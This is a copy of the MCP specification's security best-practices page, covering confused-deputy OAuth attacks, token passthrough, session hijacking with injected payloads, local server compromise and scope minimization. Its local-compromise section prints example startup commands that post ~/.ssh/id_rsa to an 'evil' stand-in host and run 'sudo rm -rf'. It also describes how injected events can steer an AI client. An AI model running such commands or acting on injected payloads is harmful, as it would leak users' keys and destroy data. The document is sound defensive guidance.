{
  "title": "Security Best Practices",
  "source_url": "https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices",
  "content": "<div id=\"enable-section-numbers\" />\n\n## Introduction\n\n### Purpose and Scope\n\nThis document provides security considerations for the Model Context Protocol (MCP), complementing the [MCP Authorization](../basic/authorization.mdx) specification. This document identifies security risks, attack vectors, and best practices specific to MCP implementations.\n\nThe primary audience for this document includes developers implementing MCP authorization flows, MCP server operators, and security professionals evaluating MCP-based systems. This document should be read alongside the MCP Authorization specification and [OAuth 2.0 security best practices](https://datatracker.ietf.org/doc/html/rfc9700).\n\n## Attacks and Mitigations\n\nThis section gives a detailed description of attacks on MCP implementations, along with potential countermeasures.\n\n### Confused Deputy Problem\n\nAttackers can exploit MCP proxy servers that connect to third-party APIs, creating \"[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)\" vulnerabilities. This attack allows malicious clients to obtain authorization codes without proper user consent by exploiting the combination of static client IDs, dynamic client registration, and consent cookies.\n\n#### Terminology\n\n**MCP Proxy Server**\n: An MCP server that connects MCP clients to third-party APIs, offering MCP features while delegating operations and acting as a single OAuth client to the third-party API server.\n\n**Third-Party Authorization Server**\n: Authorization server that protects the third-party API. It may lack dynamic client registration support, requiring the MCP proxy to use a static client ID for all requests.\n\n**Third-Party API**\n: The protected resource server that provides the actual API functionality. Access to this\nAPI requires tokens issued by the third-party authorization server.\n\n**Static Client ID**\n: A fixed OAuth 2.0 client identifier used by the MCP proxy server when communicating with\nthe third-party authorization server. This Client ID refers to the MCP server acting as a client\nto the Third-Party API. It is the same value for all MCP server to Third-Party API interactions regardless of\nwhich MCP client initiated the request.\n\n#### Vulnerable Conditions\n\nThis attack becomes possible when all of the following conditions are present:\n\n* MCP proxy server uses a **static client ID** with a third-party authorization server\n* MCP proxy server allows MCP clients to **dynamically register** (each getting their own client\\_id)\n* The third-party authorization server sets a **consent cookie** after the first authorization\n* MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization\n\n#### Architecture and Attack Flows\n\n##### Normal OAuth proxy usage (preserves user consent)\n\n```mermaid  theme={null}\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant MC as MCP Client\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n\n    Note over UA,M: Initial Auth flow completed\n\n    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server\n\n    M->>UA: Redirect to third party authorization server\n    UA->>TAS: Authorization request (client_id: mcp-proxy)\n    TAS->>UA: Authorization consent screen\n    Note over UA: Review consent screen\n    UA->>TAS: Approve\n    TAS->>UA: Set consent cookie for client ID: mcp-proxy\n    TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n    UA->>M: 3P Authorization code\n    Note over M,TAS: Exchange 3P code for 3P token\n    Note over M: Generate MCP authorization code\n    M->>UA: Redirect to MCP Client with MCP authorization code\n\n    Note over M,UA: Exchange code for token, etc.\n```\n\n##### Malicious OAuth proxy usage (skips user consent)\n\n```mermaid  theme={null}\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n    participant A as Attacker\n\n\n    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)\n    A->>M: Dynamically register malicious client, redirect_uri: attacker.com\n    A->>UA: Sends malicious link\n    UA->>TAS: Authorization request (client_id: mcp-proxy) + consent cookie\n    rect rgba(255, 17, 0, 0.67)\n    TAS->>TAS: Cookie present, consent skipped\n    end\n\n   TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n   UA->>M: 3P Authorization code\n   Note over M,TAS: Exchange 3P code for 3P token\n   Note over M: Generate MCP authorization code\n   M->>UA: Redirect to attacker.com with MCP Authorization code\n   UA->>A: MCP Authorization code delivered to attacker.com\n   Note over M,A: Attacker exchanges MCP code for MCP token\n   A->>M: Attacker impersonates user to MCP server\n```\n\n#### Attack Description\n\nWhen an MCP proxy server uses a static client ID to authenticate with a third-party\nauthorization server, the following attack becomes possible:\n\n1. A user authenticates normally through the MCP proxy server to access the third-party API\n2. During this flow, the third-party authorization server sets a cookie on the user agent\n   indicating consent for the static client ID\n3. An attacker later sends the user a malicious link containing a crafted authorization request which contains a malicious redirect URI along with a new dynamically registered client ID\n4. When the user clicks the link, their browser still has the consent cookie from the previous legitimate request\n5. The third-party authorization server detects the cookie and skips the consent screen\n6. The MCP authorization code is redirected to the attacker's server (specified in the malicious `redirect_uri` parameter during [dynamic client registration](/specification/2025-11-25/basic/authorization#dynamic-client-registration))\n7. The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user's explicit approval\n8. The attacker now has access to the third-party API as the compromised user\n\n#### Mitigation\n\nTo prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls as detailed below.\n\n##### Consent Flow Implementation\n\nThe following diagram shows how to properly implement per-client consent that runs **before** the third-party authorization flow:\n\n```mermaid  theme={null}\nsequenceDiagram\n    participant Client as MCP Client\n    participant Browser as User's Browser\n    participant MCP as MCP Server\n    participant ThirdParty as Third-Party AuthZ Server\n\n    Note over Client,ThirdParty: 1. Client Registration (Dynamic)\n    Client->>MCP: Register with redirect_uri\n    MCP-->>Client: client_id\n\n    Note over Client,ThirdParty: 2. Authorization Request\n    Client->>Browser: Open MCP server authorization URL\n    Browser->>MCP: GET /authorize?client_id=...&redirect_uri=...\n\n    alt Check MCP Server Consent\n        MCP->>MCP: Check consent for this client_id\n        Note over MCP: Not previously approved\n    end\n\n    MCP->>Browser: Show MCP server-owned consent page\n    Note over Browser: \"Allow [Client Name] to access [Third-Party API]?\"\n    Browser->>MCP: POST /consent (approve)\n    MCP->>MCP: Store consent decision for client_id\n\n    Note over Client,ThirdParty: 3. Forward to Third-Party\n    MCP->>Browser: Redirect to third-party /authorize\n    Note over MCP: Use static client_id for third-party\n\n    Browser->>ThirdParty: Authorization request (static client_id)\n    ThirdParty->>Browser: User authenticates & consents\n    ThirdParty->>Browser: Redirect with auth code\n\n    Browser->>MCP: Callback with third-party code\n    MCP->>ThirdParty: Exchange code for token (using static client_id)\n    MCP->>Browser: Redirect to client's registered redirect_uri\n```\n\n##### Required Protections\n\n**Per-Client Consent Storage**\n\nMCP proxy servers **MUST**:\n\n* Maintain a registry of approved `client_id` values per user\n* Check this registry **before** initiating the third-party authorization flow\n* Store consent decisions securely (server-side database, or server specific cookies)\n\n**Consent UI Requirements**\n\nThe MCP-level consent page **MUST**:\n\n* Clearly identify the requesting MCP client by name\n* Display the specific third-party API scopes being requested\n* Show the registered `redirect_uri` where tokens will be sent\n* Implement CSRF protection (e.g., state parameter, CSRF tokens)\n* Prevent iframing via `frame-ancestors` CSP directive or `X-Frame-Options: DENY` to prevent clickjacking\n\n**Consent Cookie Security**\n\nIf using cookies to track consent decisions, they **MUST**:\n\n* Use `__Host-` prefix for cookie names\n* Set `Secure`, `HttpOnly`, and `SameSite=Lax` attributes\n* Be cryptographically signed or use server-side sessions\n* Bind to the specific `client_id` (not just \"user has consented\")\n\n**Redirect URI Validation**\n\nThe MCP proxy server **MUST**:\n\n* Validate that the `redirect_uri` in authorization requests exactly matches the registered URI\n* Reject requests if the `redirect_uri` has changed without re-registration\n* Use exact string matching (not pattern matching or wildcards)\n\n**OAuth State Parameter Validation**\n\nThe OAuth `state` parameter is critical to prevent authorization code interception and CSRF attacks. Proper state validation ensures that consent approval at the authorization endpoint is enforced at the callback endpoint.\n\nMCP proxy servers implementing OAuth flows **MUST**:\n\n* Generate a cryptographically secure random `state` value for each authorization request\n* Store the `state` value server-side (in a secure session store or encrypted cookie) **only after** consent has been explicitly approved\n* Set the `state` tracking cookie/session **immediately before** redirecting to the third-party identity provider (not before consent approval)\n* Validate at the callback endpoint that the `state` query parameter exactly matches the stored value in the callback request's cookies or in the request's cookie-based session\n* Reject any callback requests where the `state` parameter is missing or does not match\n* Ensure `state` values are single-use (delete after validation) and have a short expiration time (e.g., 10 minutes)\n\nThe consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen at the MCP server's authorization endpoint. Setting this cookie before consent approval renders the consent screen ineffective, as an attacker could bypass it by crafting a malicious authorization request.\n\n### Token Passthrough\n\n\"Token passthrough\" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued *to the MCP server* and passes them through to the downstream API.\n\n#### Risks\n\nToken passthrough is explicitly forbidden in the [authorization specification](/specification/2025-11-25/basic/authorization) as it introduces a number of security risks, that include:\n\n* **Security Control Circumvention**\n  * The MCP Server or downstream APIs might implement important security controls like rate limiting, request validation, or traffic monitoring, that depend on the token audience or other credential constraints. If clients can obtain and use tokens directly with the downstream APIs without the MCP server validating them properly or ensuring that the tokens are issued for the right service, they bypass these controls.\n* **Accountability and Audit Trail Issues**\n  * The MCP Server will be unable to identify or distinguish between MCP Clients when clients are calling with an upstream-issued access token which may be opaque to the MCP Server.\n  * The downstream Resource Serverâ€™s logs may show requests that appear to come from a different source with a different identity, rather than the MCP server that is actually forwarding the tokens.\n  * Both factors make incident investigation, controls, and auditing more difficult.\n  * If the MCP Server passes tokens without validating their claims (e.g., roles, privileges, or audience) or other metadata, a malicious actor in possession of a stolen token can use the server as a proxy for data exfiltration.\n* **Trust Boundary Issues**\n  * The downstream Resource Server grants trust to specific entities. This trust might include assumptions about origin or client behavior patterns. Breaking this trust boundary could lead to unexpected issues.\n  * If the token is accepted by multiple services without proper validation, an attacker compromising one service can use the token to access other connected services.\n* **Future Compatibility Risk**\n  * Even if an MCP Server starts as a \"pure proxy\" today, it might need to add security controls later. Starting with proper token audience separation makes it easier to evolve the security model.\n\n#### Mitigation\n\nMCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server.\n\n### Session Hijacking\n\nSession hijacking is an attack vector where a client is provided a session ID by the server, and an unauthorized party is able to obtain and use that same session ID to impersonate the original client and perform unauthorized actions on their behalf.\n\n#### Session Hijack Prompt Injection\n\n```mermaid  theme={null}\nsequenceDiagram\n    participant Client\n    participant ServerA\n    participant Queue\n    participant ServerB\n    participant Attacker\n\n    Client->>ServerA: Initialize (connect to streamable HTTP server)\n    ServerA-->>Client: Respond with session ID\n\n    Attacker->>ServerB: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>ServerB: Trigger event (malicious payload, using session ID)\n    ServerB->>Queue: Enqueue event (keyed by session ID)\n\n    ServerA->>Queue: Poll for events (using session ID)\n    Queue-->>ServerA: Event data (malicious payload)\n\n    ServerA-->>Client: Async response (malicious payload)\n    Client->>Client: Acts based on malicious payload\n```\n\n#### Session Hijack Impersonation\n\n```mermaid  theme={null}\nsequenceDiagram\n    participant Client\n    participant Server\n    participant Attacker\n\n    Client->>Server: Initialize (login/authenticate)\n    Server-->>Client: Respond with session ID (persistent session created)\n\n    Attacker->>Server: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>Server: Make API call (using session ID, no re-auth)\n    Server-->>Attacker: Respond as if Attacker is Client (session hijack)\n```\n\n#### Attack Description\n\nWhen you have multiple stateful HTTP servers that handle MCP requests, the following attack vectors are possible:\n\n**Session Hijack Prompt Injection**\n\n1. The client connects to **Server A** and receives a session ID.\n\n2. The attacker obtains an existing session ID and sends a malicious event to **Server B** with said session ID.\n   * When a server supports [redelivery/resumable streams](/specification/2025-11-25/basic/transports#resumability-and-redelivery), deliberately terminating the request before receiving the response could lead to it being resumed by the original client via the GET request for server sent events.\n   * If a particular server initiates server sent events as a consequence of a tool call such as a `notifications/tools/list_changed`, where it is possible to affect the tools that are offered by the server, a client could end up with tools that they were not aware were enabled.\n\n3. **Server B** enqueues the event (associated with session ID) into a shared queue.\n\n4. **Server A** polls the queue for events using the session ID and retrieves the malicious payload.\n\n5. **Server A** sends the malicious payload to the client as an asynchronous or resumed response.\n\n6. The client receives and acts on the malicious payload, leading to potential compromise.\n\n**Session Hijack Impersonation**\n\n1. The MCP client authenticates with the MCP server, creating a persistent session ID.\n2. The attacker obtains the session ID.\n3. The attacker makes calls to the MCP server using the session ID.\n4. MCP server does not check for additional authorization and treats the attacker as a legitimate user, allowing unauthorized access or actions.\n\n#### Mitigation\n\nTo prevent session hijacking and event injection attacks, the following mitigations should be implemented:\n\nMCP servers that implement authorization **MUST** verify all inbound requests.\nMCP Servers **MUST NOT** use sessions for authentication.\n\nMCP servers **MUST** use secure, non-deterministic session IDs.\nGenerated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers that could be guessed by an attacker. Rotating or expiring session IDs can also reduce the risk.\n\nMCP servers **SHOULD** bind session IDs to user-specific information.\nWhen storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.\n\nMCP servers can optionally leverage additional unique identifiers.\n\n### Local MCP Server Compromise\n\nLocal MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows. These servers may have direct access to the user's system and may be accessible to other processes running on the user's machine, making them attractive targets for attacks.\n\n#### Attack Description\n\nLocal MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:\n\n1. An attacker includes a malicious \"startup\" command in a client configuration\n2. An attacker distributes a malicious payload inside the server itself\n3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding\n\nExample malicious startup commands that could be embedded:\n\n```bash  theme={null}\n# Data exfiltration\nnpx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location\n\n# Privilege escalation\nsudo rm -rf /important/system/files && echo \"MCP server installed!\"\n```\n\n#### Risks\n\nLocal MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:\n\n* **Arbitrary code execution**. Attackers can execute any command with MCP client privileges.\n* **No visibility**. Users have no insight into what commands are being executed.\n* **Command obfuscation**. Malicious actors can use complex or convoluted commands to appear legitimate.\n* **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised javascript.\n* **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.\n\n#### Mitigation\n\nIf an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.\n\n**Pre-Configuration Consent**\n\nDisplay a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:\n\n* Show the exact command that will be executed, without truncation (include arguments and parameters)\n* Clearly identify it as a potentially dangerous operation that executes code on the user's system\n* Require explicit user approval before proceeding\n* Allow users to cancel the configuration\n\nThe MCP client **SHOULD** implement additional checks and guardrails to mitigate potential code execution attack vectors:\n\n* Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)\n* Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)\n* Warn that MCP servers run with the same privileges as the client\n* Execute MCP server commands in a sandboxed environment with minimal default privileges\n* Launch MCP servers with restricted access to the file system, network, and other system resources\n* Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed\n* Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)\n\nMCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:\n\n* Use the `stdio` transport to limit access to just the MCP client\n* Restrict access if using an HTTP transport, such as:\n  * Require an authorization token\n  * Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access\n\n### Scope Minimization\n\nPoor scope design increases token compromise impact, elevates user friction, and obscures audit trails.\n\n#### Attack Description\n\nAn attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables lateral data access, privilege chaining, and difficult revocation without re-consenting the entire surface.\n\n#### Risks\n\n* Expanded blast radius: stolen broad token enables unrelated tool/resource access\n* Higher friction on revocation: revoking a max-privilege token disrupts all workflows\n* Audit noise: single omnibus scope masks user intent per operation\n* Privilege chaining: attacker can immediately invoke high-risk tools without further elevation prompts\n* Consent abandonment: users decline dialogs listing excessive scopes\n* Scope inflation blindness: lack of metrics makes over-broad requests normalised\n\n#### Mitigation\n\nImplement a progressive, least-privilege scope model:\n\n* Minimal initial scope set (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations\n* Incremental elevation via targeted `WWW-Authenticate` `scope=\"...\"` challenges when privileged operations are first attempted\n* Down-scoping tolerance: server should accept reduced scope tokens; auth server MAY issue a subset of requested scopes\n\nServer guidance:\n\n* Emit precise scope challenges; avoid returning the full catalog\n* Log elevation events (scope requested, granted subset) with correlation IDs\n\nClient guidance:\n\n* Begin with only baseline scopes (or those specified by initial `WWW-Authenticate`)\n* Cache recent failures to avoid repeated elevation loops for denied scopes\n\n#### Common Mistakes\n\n* Publishing all possible scopes in `scopes_supported`\n* Using wildcard or omnibus scopes (`*`, `all`, `full-access`)\n* Bundling unrelated privileges to preempt future prompts\n* Returning entire scope catalog in every challenge\n* Silent scope semantic changes without versioning\n* Treating claimed scopes in token as sufficient without server-side authorization logic\n\nProper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.",
  "content_length": 23379
}